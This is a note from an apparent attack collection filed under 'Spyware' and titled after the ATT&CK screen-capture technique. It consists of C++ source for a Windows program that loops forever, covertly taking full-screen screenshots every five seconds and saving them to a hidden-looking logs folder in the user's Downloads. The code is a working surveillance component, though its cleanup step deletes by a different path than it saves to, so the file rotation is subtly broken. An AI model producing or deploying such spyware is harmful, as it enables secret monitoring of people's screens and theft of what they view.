---
title: "Collection.T1113.Screen Capture"
folder: "Ca≈Çe Ataki/1. Spyware"
---





#include <iostream>
#include <windows.h>
#include <gdiplus.h>
#include <chrono>
#include <thread>
#include <string>
#include <vector>
#include <filesystem>

namespace fs = std::filesystem;
using namespace Gdiplus;

const int NUM_SCREENSHOTS_TO_KEEP = 5;
const int SCREENSHOT_INTERVAL_SECONDS = 5;

void SaveHBITMAPToFile(HBITMAP hBitmap, const wchar_t* filename);
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);

std::wstring StringToWString(const std::string& str) {
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring wstr(size, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], size);
    return wstr;
}

void CaptureAndSaveScreenshot() {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    HDC hScreenDC = GetDC(NULL);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);

    std::time_t now = std::time(nullptr);
    std::tm timeinfo;
    localtime_s(&timeinfo, &now);
    char filename[100];
    std::strftime(filename, sizeof(filename), "C:\\Users\\User\\Downloads\\logs\\screenshot_%Y%m%d_%H%M%S.bmp", &timeinfo);

    std::wstring wfilename = StringToWString(filename);

    SaveHBITMAPToFile(hBitmap, wfilename.c_str());

    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    GdiplusShutdown(gdiplusToken);
}

void SaveHBITMAPToFile(HBITMAP hBitmap, const wchar_t* filename) {
    Bitmap bitmap(hBitmap, NULL);
    CLSID clsid;
    GetEncoderClsid(L"image/bmp", &clsid);
    bitmap.Save(filename, &clsid, NULL);
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    ImageCodecInfo* pImageCodecInfo = NULL;

    GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;

    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }

    free(pImageCodecInfo);
    return -1;
}

int main() {
    
    std::vector<std::string> screenshotFiles;

    while (true) {
        CaptureAndSaveScreenshot();

        std::time_t now = std::time(nullptr);
        std::tm timeinfo;
        localtime_s(&timeinfo, &now);
        char filename[100];
        std::strftime(filename, sizeof(filename), "screenshot_%Y%m%d_%H%M%S.bmp", &timeinfo);
        screenshotFiles.push_back(filename);

        if (screenshotFiles.size() > NUM_SCREENSHOTS_TO_KEEP) {
            fs::remove(screenshotFiles.front());
            screenshotFiles.erase(screenshotFiles.begin());
        }

        std::this_thread::sleep_for(std::chrono::seconds(SCREENSHOT_INTERVAL_SECONDS));
    }

    return 0;
}
